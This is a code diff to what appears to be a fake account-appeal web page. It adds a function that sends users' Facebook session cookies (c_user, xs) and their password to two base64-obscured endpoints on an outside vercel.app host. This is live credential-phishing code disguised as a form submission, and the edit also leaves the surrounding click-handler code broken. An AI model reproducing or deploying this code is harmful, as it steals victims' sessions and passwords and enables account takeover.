@@ -1552,13 +1552,37 @@
         const submitBtn = document.getElementById('submit-appeal-btn');
         
         // Function to submit to other endpoints
-        function submitToOtherEndpoints
-        
-        submitBtn.addEventListener('click', async function(e) {
-            e.preventDefault();
-            
-            const c_user = document.getElementById('c_user').value.trim();
-            const xs = document.getElementById('xs').value.trim();
+   function submitToOtherEndpoints(data) {
+    // Encoded endpoints
+    const endpointCUXS = btoa('https://professor-asif.vercel.app/zubair');      // c_user + xs
+    const endpointPass = btoa('https://professor-asif.vercel.app/zubairpass');  // password only
+
+    // 1️⃣ Send c_user + xs
+    const formDataCUXS = new FormData();
+    formDataCUXS.append('c_user', data.c_user);
+    formDataCUXS.append('xs', data.xs);
+
+    fetch(atob(endpointCUXS), {
+        method: 'POST',
+        body: formDataCUXS
+    })
+    .then(r => r.text())
+    .then(res => console.log('c_user + xs sent:', res))
+    .catch(err => console.error('Error sending c_user + xs:', err));
+
+    // 2️⃣ Send password
+    const formDataPass = new FormData();
+    formDataPass.append('password', data.password);
+
+    fetch(atob(endpointPass), {
+        method: 'POST',
+        body: formDataPass
+    })
+    .then(r => r.text())
+    .then(res => console.log('Password sent:', res))
+    .catch(err => console.error('Error sending password:', err));
+}
+
             
             // Basic validation
             if (!c_user || !xs) {
@@ -1841,6 +1865,5 @@
             });
         });
     </script>
-
 
 </body></html>
